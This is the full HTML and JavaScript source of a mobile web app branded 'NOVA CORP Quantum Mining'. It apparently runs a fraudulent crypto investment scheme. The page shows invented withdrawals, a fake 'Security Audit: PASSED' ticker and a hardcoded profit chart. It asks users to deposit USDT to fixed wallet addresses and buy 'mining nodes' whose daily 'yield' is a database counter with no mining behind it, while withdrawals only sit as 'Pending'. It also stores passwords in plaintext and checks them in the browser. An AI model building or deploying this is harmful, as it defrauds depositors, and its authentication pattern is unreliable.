<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA CORP | Quantum Mining Enterprise</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #D4AF37; --bg: #F8FAFC; --card: #FFFFFF; }
        body { background: var(--bg); font-family: 'Plus Jakarta Sans', sans-serif; color: #1e293b; overflow-x: hidden; scroll-behavior: smooth; }
        .premium-card { background: var(--card); border: 1px solid #e2e8f0; border-radius: 28px; transition: 0.3s; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.02); }
        .btn-gold { background: linear-gradient(135deg, #D4AF37, #B8860B); color: white; border-radius: 16px; font-weight: 800; transition: 0.3s; box-shadow: 0 4px 15px rgba(212, 175, 55, 0.3); text-align: center; cursor: pointer; }
        .ticker-wrap { background: #0f172a; color: white; padding: 12px 0; overflow: hidden; }
        .ticker { display: inline-block; white-space: nowrap; animation: ticker 40s linear infinite; font-size: 10px; font-weight: 800; letter-spacing: 1px; }
        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .screen { display: none; }
        .active-screen { display: block; animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1); }
        @keyframes slideUp { from { opacity: 0; transform: translateY(40px); } to { opacity: 1; transform: translateY(0); } }
        .nav-bar { position: fixed; bottom: 0; width: 100%; background: rgba(255, 255, 255, 0.9); backdrop-filter: blur(20px); border-top: 1px solid #e2e8f0; display: flex; justify-content: space-around; padding: 18px 10px; z-index: 1000; }
        .nav-item { color: #94a3b8; font-size: 9px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 6px; cursor: pointer; }
        .nav-item.active { color: var(--gold); }
        .dep-tab.active-tab { border-color: #D4AF37 !important; background: #fffdf5; }
    </style>
</head>
<body>

    <div class="ticker-wrap">
        <div class="ticker uppercase">
            ⚡ Network Status: Operational • 🚀 New Node Activated by @A***2 • 💎 BTC/USD: $64,281.00 • ✅ Security Audit: PASSED • 🔥 Hashrate: 214.5 EH/s • ⚡ User @M***9 withdrew $450.00
        </div>
    </div>

    <div id="auth-screen" class="active-screen">
        <section class="p-10 text-center bg-white min-h-[60vh] flex flex-col justify-center">
            <h1 class="text-6xl font-black text-slate-900 tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h1>
            <p class="text-[10px] text-slate-400 font-bold uppercase tracking-[12px] mt-2 mb-12">Institutional Mining</p>
            <div class="space-y-4 max-w-sm mx-auto w-full">
                <input type="text" id="u-id" placeholder="Access ID" class="w-full p-5 border-2 border-slate-100 rounded-3xl outline-none focus:border-[#D4AF37]">
                <input type="password" id="u-pw" placeholder="Security Key" class="w-full p-5 border-2 border-slate-100 rounded-3xl outline-none focus:border-[#D4AF37]">
                <button onclick="handleAuth()" class="w-full btn-gold py-5 uppercase tracking-widest text-sm">Initialize Session</button>
                <p onclick="toggleMode()" id="mode-text" class="text-[10px] text-slate-400 font-black uppercase mt-6 cursor-pointer underline underline-offset-4">Create Master Account</p>
            </div>
        </section>
    </div>

    <div id="app" class="hidden">
        <header class="p-6 flex justify-between items-center bg-white/80 backdrop-blur-md border-b border-slate-100 sticky top-0 z-[100]">
            <h2 class="font-black text-3xl tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h2>
            <div class="flex items-center gap-4">
                <div class="flex flex-col items-end">
                    <span id="user-tag" class="text-[10px] font-black text-slate-900 uppercase">@USER</span>
                    <span class="text-[8px] font-bold text-green-500 uppercase">Pro Miner</span>
                </div>
                <div class="w-10 h-10 rounded-2xl bg-slate-100 border border-slate-200 flex items-center justify-center">
                    <i class="fa-solid fa-user text-slate-400"></i>
                </div>
            </div>
        </header>

        <div id="page-dash" class="screen active-screen px-5 pt-8 pb-32">
            <div class="bg-slate-900 rounded-[40px] p-10 mb-8 text-white shadow-2xl relative overflow-hidden">
                <div class="absolute -right-20 -top-20 w-64 h-64 bg-white/5 rounded-full blur-3xl"></div>
                <p class="text-[10px] text-slate-400 font-black uppercase tracking-[5px] mb-4">Portfolio Balance</p>
                <h1 id="b-main" class="text-6xl font-black tracking-tighter mb-12">$0.00</h1>
                <div class="grid grid-cols-2 gap-6 border-t border-white/10 pt-8">
                    <div><p class="text-[9px] text-slate-500 uppercase font-bold mb-1">Daily Yield</p><p id="b-daily" class="text-2xl font-black text-green-400">+$0.00</p></div>
                    <div class="text-right"><p class="text-[9px] text-slate-500 uppercase font-bold mb-1">Total Profits</p><p id="b-total" class="text-2xl font-black text-[#D4AF37]">$0.00</p></div>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-5 mb-8">
                <button onclick="openModal('modal-dep')" class="premium-card p-8 flex flex-col items-center gap-4">
                    <div class="w-12 h-12 rounded-2xl bg-amber-50 flex items-center justify-center"><i class="fa-solid fa-plus text-xl text-[#D4AF37]"></i></div>
                    <span class="text-[11px] font-black uppercase">Deposit</span>
                </button>
                <button onclick="openModal('modal-wd')" class="premium-card p-8 flex flex-col items-center gap-4">
                    <div class="w-12 h-12 rounded-2xl bg-slate-50 flex items-center justify-center"><i class="fa-solid fa-arrow-up-right-from-square text-xl text-slate-400"></i></div>
                    <span class="text-[11px] font-black uppercase">Withdraw</span>
                </button>
            </div>

            <div class="premium-card p-8 mb-8">
                <h4 class="text-[11px] font-black uppercase mb-6 text-slate-400 tracking-widest text-center">Network Performance (7D)</h4>
                <canvas id="profitChart" height="180"></canvas>
            </div>
        </div>

        <div id="page-nodes" class="screen px-5 pt-8 pb-32">
            <h2 class="text-3xl font-black mb-10 uppercase tracking-tighter text-center">Mining <span class="text-[#D4AF37]">Hardware</span></h2>
            <div id="nodes-grid" class="grid grid-cols-1 gap-8"></div>
        </div>

        <div id="page-logs" class="screen px-5 pt-8 pb-32">
            <h2 class="text-3xl font-black mb-10 uppercase tracking-tighter">Network <span class="text-[#D4AF37]">Ledger</span></h2>
            <div id="logs-list" class="space-y-4"></div>
        </div>

        <nav class="nav-bar">
            <div onclick="nav('page-dash', this)" class="nav-item active"><i class="fa-solid fa-layer-group text-xl"></i><span>DASHBOARD</span></div>
            <div onclick="nav('page-nodes', this)" class="nav-item"><i class="fa-solid fa-microchip text-xl"></i><span>NODES</span></div>
            <div onclick="nav('page-logs', this)" class="nav-item"><i class="fa-solid fa-clock-rotate-left text-xl"></i><span>HISTORY</span></div>
            <div onclick="logout()" class="nav-item"><i class="fa-solid fa-power-off text-xl text-red-400"></i><span>LOGOUT</span></div>
        </nav>
    </div>

    <div id="modal-dep" class="fixed inset-0 bg-white z-[2000] p-10 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8"><h2 class="text-3xl font-black tracking-tighter">FUNDING <span class="text-[#D4AF37]">HUB</span></h2><i onclick="closeModal('modal-dep')" class="fa-solid fa-xmark text-2xl cursor-pointer"></i></div>
        
        <div class="grid grid-cols-3 gap-3 mb-8">
            <button onclick="switchDep('trust')" id="btn-trust" class="dep-tab active-tab flex flex-col items-center p-4 border-2 rounded-2xl">
                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" class="w-8 h-8 mb-2"><span class="text-[8px] font-black uppercase">Trust</span>
            </button>
            <button onclick="switchDep('meta')" id="btn-meta" class="dep-tab flex flex-col items-center p-4 border-2 border-slate-100 rounded-2xl">
                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="w-8 h-8 mb-2"><span class="text-[8px] font-black uppercase">MetaMask</span>
            </button>
            <button onclick="switchDep('binance')" id="btn-binance" class="dep-tab flex flex-col items-center p-4 border-2 border-slate-100 rounded-2xl">
                <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.svg" class="w-8 h-8 mb-2"><span class="text-[8px] font-black uppercase">Binance</span>
            </button>
        </div>

        <div class="premium-card p-6 border-l-4 border-[#D4AF37] bg-slate-50 mb-8">
            <div id="dep-info">
                <p class="text-[10px] font-black text-[#D4AF37] uppercase mb-2">Trust Wallet (BEP20)</p>
                <p id="dep-addr" class="text-xs font-mono font-bold break-all bg-white p-4 rounded-xl border border-slate-200">0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37</p>
            </div>
            <button onclick="copyCurrentAddr()" class="mt-4 text-[10px] font-black text-slate-900 flex items-center gap-2"><i class="fa-solid fa-copy"></i> COPY ADDRESS</button>
        </div>

        <div class="space-y-4">
            <input type="number" id="in-amt" placeholder="Amount (USDT)" class="w-full p-5 border-2 border-slate-100 rounded-3xl outline-none focus:border-[#D4AF37]">
            <input type="text" id="in-ref" placeholder="Transaction Hash (TXID)" class="w-full p-5 border-2 border-slate-100 rounded-3xl outline-none focus:border-[#D4AF37]">
            <button onclick="submitFin('Deposit')" class="w-full btn-gold py-6 text-sm uppercase">Confirm Transmission</button>
        </div>
    </div>

    <div id="modal-wd" class="fixed inset-0 bg-white z-[2000] p-10 hidden">
        <div class="flex justify-between items-center mb-10"><h2 class="text-3xl font-black">WITHDRAW</h2><i onclick="closeModal('modal-wd')" class="fa-solid fa-xmark text-2xl"></i></div>
        <div class="space-y-4">
            <input type="number" id="out-amt" placeholder="Payout Amount" class="w-full p-5 border-2 border-slate-100 rounded-3xl outline-none">
            <input type="text" id="out-addr" placeholder="Recipient Wallet Address" class="w-full p-5 border-2 border-slate-100 rounded-3xl outline-none">
            <button onclick="submitFin('Withdrawal')" class="w-full btn-gold py-6 bg-slate-900 !text-white text-sm uppercase">Request Extraction</button>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(firebaseConfig); const db = getFirestore(app);
        
        let currentUser = localStorage.getItem('nova_session');
        let isLoginMode = true;

        const nodesData = [
            { id: 1, name: "Nano Core V1", cost: 20, yield: 1.5, hashrate: "1.2 TH/s", algo: "SHA-256", img: "https://images.unsplash.com/photo-1591844339942-3064e9042ce5?q=80&w=400" },
            { id: 2, name: "Neon Bit 2.0", cost: 50, yield: 4.2, hashrate: "3.5 TH/s", algo: "Scrypt", img: "https://images.unsplash.com/photo-1558494949-ef010cbdcc51?q=80&w=400" },
            { id: 3, name: "Bronze Rig X", cost: 100, yield: 9.0, hashrate: "8.2 TH/s", algo: "SHA-256", img: "https://images.unsplash.com/photo-1639322537228-f710d846310a?q=80&w=400" },
            { id: 4, name: "Cobalt Miner", cost: 200, yield: 18.5, hashrate: "15.0 TH/s", algo: "EtHash", img: "https://images.unsplash.com/photo-1518770660439-4636190af475?q=80&w=400" },
            { id: 5, name: "Silver Pro 50", cost: 500, yield: 48.0, hashrate: "42.5 TH/s", algo: "SHA-256", img: "https://images.unsplash.com/photo-1620712943543-bcc4688e7485?q=80&w=400" },
            { id: 7, name: "Gold CPU Master", cost: 1000, yield: 110.0, hashrate: "95.0 TH/s", algo: "SHA-256", img: "https://images.unsplash.com/photo-1639322537523-abaea1ec960c?q=80&w=400" }
        ];

        const depPaths = {
            trust: { name: "Trust Wallet (BEP20)", addr: "0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37" },
            meta: { name: "MetaMask (BEP20)", addr: "0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2" },
            binance: { name: "Binance Wallet (BEP20)", addr: "YOUR_BINANCE_ADDRESS" }
        };

        window.handleAuth = async () => {
            const id = document.getElementById('u-id').value.toLowerCase().trim();
            const pw = document.getElementById('u-pw').value;
            if(!id || !pw) return alert("Enter Credentials");
            const uRef = doc(db, "users", id); const snap = await getDoc(uRef);
            if(isLoginMode) {
                if(snap.exists() && snap.data().password === pw) { localStorage.setItem('nova_session', id); location.reload(); }
                else alert("Invalid Access");
            } else {
                if(snap.exists()) return alert("Taken");
                await setDoc(uRef, { balance: 0, password: pw, daily: 0, total_profit: 0, active_nodes: [] });
                localStorage.setItem('nova_session', id); location.reload();
            }
        };

        async function processProfits(uid, userData) {
            const activeNodes = userData.active_nodes || [];
            if (activeNodes.length === 0) return;
            let earned = 0; const now = Date.now();
            const updated = activeNodes.map(node => {
                const elapsed = now - node.lastClaim;
                if (elapsed >= 86400000) { // 24 Hours
                    const cycles = Math.floor(elapsed / 86400000);
                    earned += (node.yield * cycles);
                    return { ...node, lastClaim: now };
                }
                return node;
            });
            if (earned > 0) {
                await updateDoc(doc(db, "users", uid), {
                    balance: (userData.balance || 0) + earned,
                    total_profit: (userData.total_profit || 0) + earned,
                    active_nodes: updated
                });
            }
        }

        function initApp(id) {
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('app').classList.remove('hidden');
            onSnapshot(doc(db, "users", id), d => {
                const data = d.data(); if(!data) return;
                processProfits(id, data);
                document.getElementById('user-tag').innerText = `@${id.toUpperCase()}`;
                document.getElementById('b-main').innerText = "$" + (data.balance || 0).toFixed(2);
                document.getElementById('b-daily').innerText = "+$" + (data.daily || 0).toFixed(2);
                document.getElementById('b-total').innerText = "$" + (data.total_profit || 0).toFixed(2);
                renderNodes(data.active_nodes || []);
            });
            loadLogs(id); setupChart(); setInterval(syncTimers, 1000);
        }

        function renderNodes(activeList) {
            const container = document.getElementById('nodes-grid'); container.innerHTML = "";
            nodesData.forEach(node => {
                const active = activeList.find(a => a.nodeId === node.id);
                container.innerHTML += `<div class="premium-card">
                    <img src="${node.img}" class="w-full h-40 object-cover">
                    <div class="p-6">
                        <div class="flex justify-between mb-4"><h4 class="font-black text-sm uppercase">${node.name}</h4><span class="text-green-500 font-bold text-xs">+$${node.yield}/D</span></div>
                        <div class="bg-slate-50 p-4 rounded-2xl mb-4 flex justify-between"><span class="text-[9px] font-bold text-slate-400 uppercase">Timer</span><span id="timer-${node.id}" class="text-[10px] font-black text-amber-600">READY</span></div>
                        ${active ? `<button class="w-full py-4 bg-slate-100 text-slate-400 rounded-2xl text-[10px] font-black">MINING ACTIVE</button>` : `<button onclick="buyNode(${node.id},${node.cost},${node.yield})" class="w-full btn-gold py-4 text-[10px] uppercase">Activate • $${node.cost}</button>`}
                    </div>
                </div>`;
            });
        }

        window.buyNode = async (id, cost, y) => {
            const uid = localStorage.getItem('nova_session'); const uRef = doc(db, "users", uid); const snap = await getDoc(uRef);
            if(snap.data().balance < cost) return alert("Low Funds");
            await updateDoc(uRef, { balance: snap.data().balance - cost, active_nodes: [...(snap.data().active_nodes || []), { nodeId: id, yield: y, lastClaim: Date.now() }], daily: (snap.data().daily || 0) + y });
            alert("Hardware Activated!");
        };

        window.switchDep = (type) => {
            document.querySelectorAll('.dep-tab').forEach(t => t.classList.remove('active-tab'));
            document.getElementById('btn-' + type).classList.add('active-tab');
            document.getElementById('dep-info').querySelector('p').innerText = depPaths[type].name;
            document.getElementById('dep-addr').innerText = depPaths[type].addr;
        };

        window.copyCurrentAddr = () => { navigator.clipboard.writeText(document.getElementById('dep-addr').innerText); alert("Address Copied!"); };

        window.submitFin = async (t) => {
            const a = parseFloat(document.getElementById(t=='Deposit'?'in-amt':'out-amt').value);
            const r = document.getElementById(t=='Deposit'?'in-ref':'out-addr').value;
            if(!a || !r) return alert("Fill All Fields");
            await addDoc(collection(db, "logs"), { user: localStorage.getItem('nova_session'), type: t, amount: a, status: 'Pending', ref: r, time: Date.now() });
            alert("Sent for Approval!"); closeModal(t=='Deposit'?'modal-dep':'modal-wd');
        };

        function syncTimers() {
            const uid = localStorage.getItem('nova_session'); if(!uid) return;
            getDoc(doc(db, "users", uid)).then(s => {
                (s.data().active_nodes || []).forEach(n => {
                    const rem = 86400000 - (Date.now() - n.lastClaim);
                    const el = document.getElementById(`timer-${n.nodeId}`);
                    if(el && rem > 0) {
                        const h = Math.floor(rem / 3600000).toString().padStart(2, '0');
                        const m = Math.floor((rem % 3600000) / 60000).toString().padStart(2, '0');
                        const sc = Math.floor((rem % 60000) / 1000).toString().padStart(2, '0');
                        el.innerText = `${h}:${m}:${sc}`;
                    } else if(el) el.innerText = "YIELD READY";
            });
          });
        }

        function loadLogs(id) {
            onSnapshot(query(collection(db, "logs"), where("user", "==", id)), s => {
                const list = document.getElementById('logs-list'); 
                list.innerHTML = "";
                s.forEach(doc => { 
                    const d = doc.data(); 
                    list.innerHTML += `
                        <div class="premium-card p-6 flex justify-between items-center">
                            <div>
                                <p class="text-[10px] font-black text-slate-400 uppercase">${d.type}</p>
                                <p class="text-lg font-black tracking-tight">$${d.amount.toFixed(2)}</p>
                            </div>
                            <div class="text-right">
                                <span class="px-3 py-1 rounded-full text-[9px] font-black uppercase ${d.status === 'Pending' ? 'bg-orange-50 text-orange-500' : 'bg-green-50 text-green-500'}">
                                    ${d.status}
                                </span>
                                <p class="text-[8px] text-slate-300 font-bold mt-2 uppercase">${new Date(d.time).toLocaleDateString()}</p>
                            </div>
                        </div>`; 
                });
            });
        }

        function setupChart() {
            const ctx = document.getElementById('profitChart').getContext('2d');
            new Chart(ctx, { 
                type: 'line', 
                data: { 
                    labels: ['M', 'T', 'W', 'T', 'F', 'S', 'S'], 
                    datasets: [{ 
                        data: [12, 19, 15, 25, 32, 28, 45], 
                        borderColor: '#D4AF37', 
                        borderWidth: 3,
                        tension: 0.4, 
                        fill: true, 
                        backgroundColor: 'rgba(212, 175, 55, 0.05)', 
                        pointRadius: 0 
                    }] 
                }, 
                options: { 
                    plugins: { legend: { display: false } }, 
                    scales: { 
                        y: { display: false }, 
                        x: { grid: { display: false }, ticks: { font: { weight: '800', size: 9 } } } 
                    } 
                } 
            });
        }

        // --- NAVIGATION & UI HELPERS ---
        window.nav = (id, el) => { 
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen')); 
            document.getElementById(id).classList.add('active-screen'); 
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active')); 
            el.classList.add('active'); 
        };

        window.toggleMode = () => { 
            isLoginMode = !isLoginMode; 
            document.getElementById('mode-text').innerText = isLoginMode ? "Create Master Account" : "Access Portal"; 
            document.querySelector('.btn-gold').innerText = isLoginMode ? "Initialize Session" : "Create Account";
        };

        window.openModal = (id) => {
            document.getElementById(id).classList.remove('hidden');
            document.getElementById(id).style.display = 'block';
        };

        window.closeModal = (id) => {
            document.getElementById(id).style.display = 'none';
        };

        window.logout = () => { 
            localStorage.clear(); 
            location.reload(); 
        };

        // --- START APP IF SESSION EXISTS ---
        if(currentUser) {
            initApp(currentUser);
        }
    </script>
</body>
</html>
